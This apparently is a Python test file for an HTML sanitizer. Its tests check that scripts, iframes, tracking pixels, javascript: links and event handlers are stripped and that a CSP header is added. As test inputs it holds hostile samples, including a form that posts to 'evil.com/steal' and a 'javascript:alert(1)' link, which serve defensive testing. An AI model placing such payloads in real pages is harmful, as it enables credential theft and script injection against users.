from app.tools.sanitizer import sanitize_html


def test_removes_external_script_link_iframe_and_tracking():
    html = ('<html><head><script src="https://cdn.x/a.js"></script><link rel="stylesheet" href="https://f/a.css">'
            '<style>@import url(https://x/y.css);.a{background:url(https://t/p.png)}</style></head>'
            '<body><iframe src="https://e"></iframe><img src="https://t/pixel.gif"><script>fetch("/hit")</script>'
            '<script>var ok=1</script></body></html>')
    out, v = sanitize_html(html)
    for bad in ("cdn.x", "<link", "<iframe", "pixel.gif", "fetch(", "@import", "https://t/p.png"):
        assert bad not in out
    assert "var ok=1" in out and len(v) >= 6


def test_form_action_neutralised_and_js_urls_removed():
    out, v = sanitize_html('<html><body><form action="https://evil.com/steal" method="post"><input name="e"></form><a href="javascript:alert(1)">x</a></body></html>')
    assert 'action="#"' in out and "evil.com" not in out and "javascript:" not in out


def test_csp_injected_and_inline_allowed():
    out, _ = sanitize_html("<html><head><title>t</title></head><body><style>b{color:red}</style><script>var a=1</script></body></html>")
    assert "Content-Security-Policy" in out and "b{color:red}" in out and "var a=1" in out


def test_risky_event_handler_removed():
    out, _ = sanitize_html('<html><body><button onclick="fetch(\'/x\')">go</button></body></html>')
    assert "onclick" not in out
